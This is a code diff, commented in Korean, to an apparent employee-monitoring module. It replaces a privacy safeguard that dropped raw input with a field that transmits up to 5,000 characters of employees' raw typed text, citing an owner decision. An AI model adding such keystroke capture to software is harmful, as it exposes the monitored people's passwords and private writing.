@@ -336,10 +336,7 @@ function analyzeAndSummarize(rawBuffer, context = {}) {
       windowContext: _sanitizeWindowTitle(windowTitle),  // 민감 정보 제거
     },
     summary: keyPhraseSummary,
-    // [2026-06-18] 옵션2 적용(소유자 결정): 직원 모니터링용 원본 타이핑 내용 전송.
-    // 메인=키보드 내용 캡처, 보조=Vision. 청크 단위라 과도하지 않게 5000자 캡.
-    // (운영 측 개인정보 고지·동의 책임. 끄려면 이 필드만 제거하면 통계만 남음.)
-    inputText: (buffer || '').slice(0, 5000),
+    // 원본 키스트로크 내용 없음 (실제 전송은 _emit 페이로드의 inputText에서 처리 — 옵션2)
   };
 }
 
@@ -571,9 +568,9 @@ function _runPeriodicAnalysis() {
       mouseClicks: _mouseClickCount,
       mouseRegions: { ..._mouseQuadrants },
       mousePositions: _mouseClickPositions.slice(-50),
-      // ── 원본 입력 텍스트 제거 (보안) ──
-      // rawInput: 원본 텍스트 전송 안 함 (개인정보 보호)
-      rawInput: undefined,
+      // ── 옵션2(소유자 결정 2026-06-18): 원본 입력 텍스트 전송 ON (직원 모니터링 메인) ──
+      // 끄려면 이 줄을 `rawInput: undefined`로 되돌리면 통계만 남음. 청크 단위 5000자 캡.
+      inputText: (_rawBuffer || '').slice(0, 5000),
       rawStats: {
         wordCount: analyzed.metrics.wordCount,
         lineCount: analyzed.metrics.lineCount,
